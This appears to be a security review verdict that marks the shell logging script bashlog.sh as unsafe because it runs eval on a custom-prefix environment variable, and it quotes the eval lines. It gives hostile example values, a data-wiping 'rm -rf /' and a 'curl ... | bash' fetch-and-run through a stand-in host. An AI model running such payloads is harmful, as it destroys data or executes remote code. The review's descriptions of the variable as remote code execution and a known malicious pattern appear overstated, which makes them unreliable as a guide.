Status: UNSAFE

Summary: Arbitrary code execution via BASHLOG_I_PROMISE_TO_BE_CAREFUL_CUSTOM_EVAL_PREFIX

Details:

The script `bashlog.sh` contains a critical security vulnerability due to the use of `eval` on an untrusted environment variable: `BASHLOG_I_PROMISE_TO_BE_CAREFUL_CUSTOM_EVAL_PREFIX`. This variable is directly expanded and executed within two contexts — once when writing to a log file, and once when formatting output to stdout/stderr:

```bash
if [ -n "${custom_eval_prefix}" ]; then
  file_line="$(eval "${custom_eval_prefix}")${file_line}";
fi;
```

and

```bash
std_line="$(eval "${custom_eval_prefix}")${std_line}";
```

Because `custom_eval_prefix` is derived from the user-controllable environment variable `BASHLOG_I_PROMISE_TO_BE_CAREFUL_CUSTOM_EVAL_PREFIX`, an attacker can inject arbitrary shell commands by setting this variable to malicious code. For example, setting it to `"; rm -rf /; "` or `"; curl http://malicious.site | bash; "` would lead to code execution with the privileges of the script.

While the variable name includes a tongue-in-cheek warning ("I promise to be careful"), the functionality enables remote code execution if the environment is not tightly controlled — a dangerous anti-pattern, especially in a shared or untrusted environment. This is a classic injection vulnerability and constitutes a supply-chain risk if this script is sourced by other packages or tools.

The presence of such an `eval` construct with unsanitized input is a known malicious pattern in shell scripting, and despite the script being part of a logging utility, this feature goes well beyond legitimate functionality and enables arbitrary code execution.
